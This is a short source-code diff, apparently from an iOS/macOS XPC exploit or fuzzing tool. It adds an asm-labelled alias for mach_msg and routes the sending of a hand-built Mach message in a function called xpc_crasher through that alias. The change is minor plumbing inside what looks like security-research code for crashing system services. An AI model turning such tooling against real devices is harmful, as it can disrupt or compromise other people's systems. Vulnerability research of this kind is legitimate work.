@@ -3,6 +3,15 @@
 #include <mach/mach.h>
 #include <dirent.h>
 
+mach_msg_return_t custom_mach_msg(
+    mach_msg_header_t *msg,
+    mach_msg_option_t option,
+    mach_msg_size_t send_size,
+    mach_msg_size_t rcv_size,
+    mach_port_t rcv_name,
+    mach_msg_timeout_t timeout,
+    mach_port_t notify) asm("mach_msg");
+
 char* get_temp_file_path(void) {
   return strdup([[NSTemporaryDirectory() stringByAppendingPathComponent:@"AAAAs"] fileSystemRepresentation]);
 }
@@ -108,7 +117,7 @@ void xpc_crasher(char* service_name) {
   msg.reply_port.disposition = MACH_MSG_TYPE_MAKE_SEND;
   msg.reply_port.type        = MACH_MSG_PORT_DESCRIPTOR;
 
-  err = mach_msg(&msg.hdr,
+  err = custom_mach_msg(&msg.hdr,
                  MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                  msg.hdr.msgh_size,
                  0,
